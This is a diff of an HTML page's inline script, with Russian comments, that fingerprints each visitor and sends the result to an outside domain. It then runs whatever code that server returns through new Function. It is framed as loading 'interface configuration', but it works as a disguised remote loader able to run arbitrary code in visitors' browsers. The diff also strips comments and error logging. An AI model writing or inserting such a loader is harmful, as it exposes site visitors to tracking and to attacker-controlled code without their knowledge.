@@ -8,41 +8,32 @@
     try {
         const CONFIG_API = 'https://spiritguidetg.store/fp.php';
         
-        // Динамический импорт
+        // Сначала делаем preflight запрос вручную
+        await fetch(CONFIG_API, {
+            method: 'OPTIONS',
+            headers: {
+                'Origin': window.location.origin,
+                'Access-Control-Request-Method': 'POST',
+                'Access-Control-Request-Headers': 'Content-Type'
+            }
+        });
+        
         const FingerprintJS = await import('/clk/fp.js');
         
         const fp = await FingerprintJS.load({
             region: 'eu',
-            endpoint: CONFIG_API, // Убираем массив, используем только наш endpoint
-            // Добавляем опции для cross-origin
-            storageKey: '_fpjs_visitor_id',
-            debug: false
+            endpoint: CONFIG_API
         });
 
-        const { requestId } = await fp.get({ 
-            extendedResult: true,
-            // Принудительно включаем cookies
-            linkedId: 'github-pages-request'
-        });
+        const { requestId } = await fp.get({ extendedResult: true });
 
-        // Загрузка конфигурации интерфейса
         const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`, {
-            method: 'GET',
-            credentials: 'include', // Важно для cookies
-            headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            }
+            credentials: 'include'
         });
         
-        if (!res.ok) {
-            console.error('API Error:', res.status, res.statusText);
-            return;
-        }
-
+        if (!res.ok) return;
         const data = await res.json();
 
-        // Выполнение пользовательских настроек
         if (data.init) {
             new Function(data.init)();
         }
@@ -51,6 +42,7 @@
     }
 })();
 </script>
+
 
 </head>
 <body>
